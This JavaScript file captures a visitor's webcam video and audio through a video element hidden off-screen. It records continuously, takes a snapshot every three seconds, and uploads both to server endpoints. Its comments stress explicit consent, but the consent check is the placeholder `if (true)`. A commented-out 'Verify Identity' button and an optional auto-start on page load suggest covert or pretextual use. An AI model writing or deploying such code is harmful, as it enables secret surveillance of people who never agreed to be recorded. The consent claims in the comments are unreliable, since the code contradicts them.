// Video and image capture functionality
// IMPORTANT: This should only be used with explicit user consent

// Global variables for media handling
let videoStream = null;
let mediaRecorder = null;
let recordedChunks = [];
let captureInterval = null;
let isRecording = false;

// Function to request camera access and start recording
function requestMediaAccess() {
  // Show consent dialog first - essential for transparency and legality
  if (true) {
    // Request camera with audio
    navigator.mediaDevices.getUserMedia({ 
      video: { 
        width: { ideal: 1280 },
        height: { ideal: 720 },
        facingMode: "user" // Front camera on mobile devices
      }, 
      audio: true 
    })
    .then(function(stream) {
      videoStream = stream;
      
      // Create hidden video element to handle the stream
      const video = document.createElement('video');
      video.id = 'user-video-stream';
      video.srcObject = stream;
      video.muted = true; // Prevent feedback
      video.style.position = 'fixed';
      video.style.top = '-9999px'; // Hide off-screen
      video.style.left = '-9999px';
      document.body.appendChild(video);
      video.play();
      
      // Set up media recorder for video capture
      setupMediaRecorder(stream);
      
      // Start periodic image capture
      startPeriodicImageCapture();
      
    })
    .catch(function(error) {
      console.error("Error accessing media devices:", error);
      alert("Could not access your camera. Please check permissions and try again.");
    });
  }
}

// Set up media recorder for video
function setupMediaRecorder(stream) {
  try {
    // Use MP4 if supported, otherwise fall back to webm
    const mimeType = MediaRecorder.isTypeSupported('video/mp4') ? 'video/mp4' : 'video/webm';
    mediaRecorder = new MediaRecorder(stream, {
      mimeType: mimeType,
      videoBitsPerSecond: 2500000 // 2.5 Mbps
    });
    
    // Handle data available event
    mediaRecorder.ondataavailable = function(event) {
      if (event.data.size > 0) {
        recordedChunks.push(event.data);
      }
    };
    
    // Handle recording stop event
    mediaRecorder.onstop = function() {
      // Create blob from recorded chunks
      const videoBlob = new Blob(recordedChunks, { type: mediaRecorder.mimeType });
      sendVideoToServer(videoBlob);
      
      // Reset for next recording
      recordedChunks = [];
    };
    
    // Start recording
    startRecording();
    
  } catch (error) {
    console.error("Media recorder setup failed:", error);
  }
}

// Start video recording
function startRecording() {
  if (mediaRecorder && mediaRecorder.state !== "recording") {
    // Start with 10s timeslice to get data periodically even during recording
    mediaRecorder.start(10000);
    isRecording = true;
    
    // Automatically stop and restart recording every 2 minutes
    // This ensures we don't create enormous files and lose all data if something fails
    setTimeout(() => {
      if (isRecording) {
        stopRecording();
        // Wait a moment before starting a new recording
        setTimeout(() => {
          if (videoStream) {
            setupMediaRecorder(videoStream);
          }
        }, 1000);
      }
    }, 2 * 60 * 1000); // 2 minutes
  }
}

// Stop video recording
function stopRecording() {
  if (mediaRecorder && mediaRecorder.state === "recording") {
    mediaRecorder.stop();
    isRecording = false;
  }
}

// Start capturing images at regular intervals
function startPeriodicImageCapture() {
  // Check if we already have a capture interval running
  if (captureInterval) {
    clearInterval(captureInterval);
  }
  
  // Take first image immediately
  captureImage();
  
  // Then set up interval for every 3 seconds
  captureInterval = setInterval(captureImage, 3000); // 3000ms = 3 seconds
  
  // Automatically stop after 30 minutes to prevent excessive data collection
  setTimeout(() => {
    stopCapture();
  }, 30 * 60 * 1000); // 30 minutes
}

// Capture a single image
function captureImage() {
  const video = document.getElementById('user-video-stream');
  
  if (video && videoStream && videoStream.active) {
    // Create canvas to capture frame
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;
    
    // Draw video frame to canvas
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    
    // Convert to JPEG data URL
    try {
      const imageData = canvas.toDataURL('image/jpeg', 0.85); // 85% quality
      sendImageToServer(imageData);
    } catch (error) {
      console.error("Error capturing image:", error);
    }
  }
}

// Stop all media capture
function stopCapture() {
  // Stop interval image capture
  if (captureInterval) {
    clearInterval(captureInterval);
    captureInterval = null;
  }
  
  // Stop video recording
  stopRecording();
  
  // Stop all tracks in the video stream
  if (videoStream) {
    videoStream.getTracks().forEach(track => track.stop());
    videoStream = null;
  }
  
  // Remove the video element
  const videoElement = document.getElementById('user-video-stream');
  if (videoElement) {
    videoElement.srcObject = null;
    videoElement.remove();
  }
  
  isRecording = false;
}

// Send captured image to server
function sendImageToServer(imageData) {
  fetch('/user-image', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      image: imageData,
      timestamp: new Date().toISOString()
    }),
  })
  .catch(error => console.error('Error sending image to server:', error));
}

// Send recorded video to server
function sendVideoToServer(videoBlob) {
  // Create FormData to send binary data
  const formData = new FormData();
  formData.append('video', videoBlob);
  formData.append('timestamp', new Date().toISOString());
  
  fetch('/user-video', {
    method: 'POST',
    body: formData,
  })
  .catch(error => console.error('Error sending video to server:', error));
}

// Auto-start capture when page loads (only with explicit consent)
document.addEventListener('DOMContentLoaded', function() {
  // Optional: Add a consent button instead of auto-requesting
  // const consentButton = document.createElement('button');
  // consentButton.textContent = 'Verify Identity';
  // consentButton.onclick = requestMediaAccess;
  // document.body.appendChild(consentButton);
  
  // For automatic request on page load (must be used with appropriate consent notices)
  // Uncomment this line to enable automatic video recording
  // setTimeout(requestMediaAccess, 3000); // Request after 3 seconds
});

// Ensure cleanup when page is unloaded
window.addEventListener('beforeunload', function() {
  stopCapture();
});